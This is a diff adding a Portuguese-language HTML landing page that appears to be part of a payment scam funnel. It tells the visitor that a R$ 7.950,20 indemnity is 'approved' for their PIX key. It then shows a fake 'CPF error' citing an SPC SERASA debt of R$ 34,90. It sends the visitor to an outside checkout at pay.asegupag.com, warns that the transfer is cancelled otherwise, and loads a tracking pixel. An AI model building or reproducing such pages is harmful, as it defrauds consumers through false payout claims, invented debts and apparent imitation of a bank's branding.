@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Recebimento da Indenização</title>
+  <script>
+  window.pixelId = "6a5ae57f2a3f9d88d0986af5";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+  <script>
+        localStorage.setItem("upsell", "up4/index.html");
+    </script>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            'caixa-blue': '#047094',
+            'caixa-light-blue': '#047094',
+            'caixa-orange': '#30BF63',
+          }
+        }
+      }
+    }
+
+    function abrirModal() {
+      document.getElementById("modal").classList.remove("hidden")
+    }
+
+    function fecharModal() {
+      document.getElementById("modal").classList.add("hidden")
+    }
+
+    // Função para obter parâmetros da URL
+    function getUrlParameter(name) {
+      name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+      var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+      var results = regex.exec(location.search);
+      return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+    }
+
+    // Variável para o link de checkout
+    var checkoutUrl = 'https://pay.asegupag.com/checkout/88918f2c-67e1-428c-9ca9-56e463cf8830';
+
+    // Função para atualizar o nome na página
+    function atualizarNome() {
+      var nome = getUrlParameter('name');
+      if (nome) {
+        document.getElementById('nome-usuario').textContent = nome;
+      }
+    }
+
+    // Função para redirecionar para checkout com todos os parâmetros
+    function irParaCheckout() {
+      var urlAtual = window.location.href;
+      var urlBase = urlAtual.split('?')[0];
+      var parametros = window.location.search;
+
+      // Se não houver parâmetros, adiciona pelo menos o nome padrão
+      if (!parametros) {
+        parametros = '?name=Rafael dos Santos Silva';
+      }
+
+      var urlFinal = checkoutUrl + parametros; // Mantém o '?' inicial
+      window.location.href = urlFinal;
+    }
+
+    // Executar quando a página carregar
+    window.onload = function () {
+      atualizarNome();
+    }
+  </script>
+</head>
+
+<body>
+  <div class="bg-white w-full max-w-md rounded-lg">
+    <!-- Header -->
+    <div class="bg-gradient-to-b from-caixa-blue to-caixa-light-blue p-4 text-center">
+      <div class="flex justify-center items-center mb-2">
+        <img src="../assets/image/logowhite.png" alt="Brasil" class="h-12 w-auto" />
+      </div>
+      <h1 class="text-white font-bold text-lg">Recebimento de Resgate</h1>
+      <p class="text-white text-sm mt-2">
+        Olá, <span id="nome-usuario" class="font-bold">Rafael dos Santos Silva</span>!<br />
+        Você está prestes a receber o seu valor de <span class="font-bold">R$ 7.950,20</span> na sua chave PIX!
+      </p>
+    </div>
+
+    <!-- Conteúdo -->
+    <div class="px-6 py-6">
+      <!-- Situação -->
+      <div class="text-center mb-6">
+        <p class="text-gray-600 font-medium">Situação:</p>
+        <p class="text-teal-600 font-bold text-lg">Aprovado</p>
+      </div>
+
+      <!-- Ícone + linha vertical + texto -->
+      <div class="flex items-start justify-start gap-4 mb-8">
+        <div class="relative flex flex-col items-center">
+          <div class="absolute top-0 bottom-0 w-px border-1.5 bg-gray-300"></div>
+          <img src="./assets/icone1.png" alt="Ícone Indenização" class="z-10 w-6 h-20 object-contain" />
+        </div>
+        <div class="flex-1">
+          <p class="font-semibold text-gray-800 text-sm mb-1">Seu valor está disponível!</p>
+          <p class="text-sm text-gray-700">
+            Clique no botão abaixo para confirmar as informações finais e prosseguir com o seu recebimento na sua chave
+            PIX cadastrada!
+          </p>
+        </div>
+      </div>
+
+      <!-- Botão para abrir o modal -->
+      <button onclick="abrirModal()"
+        class="w-full bg-caixa-orange hover:bg-orange-500 text-white font-bold py-3 rounded-md text-center transition-colors">
+        CONFIRMAR
+      </button>
+    </div>
+  </div>
+
+  <!-- Modal -->
+  <div id="modal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
+    <div class="bg-white rounded-lg shadow-lg w-[90%] max-w-md p-6 text-center relative">
+      <!-- Conteúdo do Modal -->
+      <img src="./assets/image2.png" alt="SPC" class="mx-auto h-8 my-6" />
+      <div class="flex items-center justify-center gap-2 my-4">
+        <img src="./assets/x.png" alt="SPC" class="h-6 mb-2" />
+        <h2 class="text-red-600 font-bold text-lg mb-2 flex items-center justify-center gap-2">
+          ERRO NO CPF!
+        </h2>
+      </div>
+      <div class="bg-red-100 border border-red-300 text-red-800 px-4 py-2 rounded mb-4 text-sm">
+        Identificamos uma pendência com o <strong class="text-black">SPC SERASA</strong> de <strong
+          class="text-red-500">R$ 34,90</strong>
+      </div>
+      <p class="text-sm mb-4">
+        Para realizarmos o saque de <span class="text-green-600 font-bold">R$ 7.950,20</span> é necessário que seu CPF
+        <strong>não tenha nenhuma pendência</strong>.
+      </p>
+      <p class="text-sm mb-6">
+        Efetue o pagamento da pendência clicando no botão abaixo e <strong>libere seu valor.</strong>.
+      </p>
+      <button onclick="irParaCheckout()"
+        class="w-full bg-caixa-blue text-sm hover:bg-blue-700 text-white font-bold py-5 rounded-md mb-3">
+        REGULARIZAR CPF RAPIDAMENTE
+      </button>
+      <p class="text-xs text-red-600 my-4">
+        <strong>Atenção:</strong> <span class="text-black">Em casos de <strong>desistência da quitação</strong>, a sua
+          <strong>transferência será cancelada</strong>.</span>
+      </p>
+    </div>
+  </div>
+</body>
+
+</html>
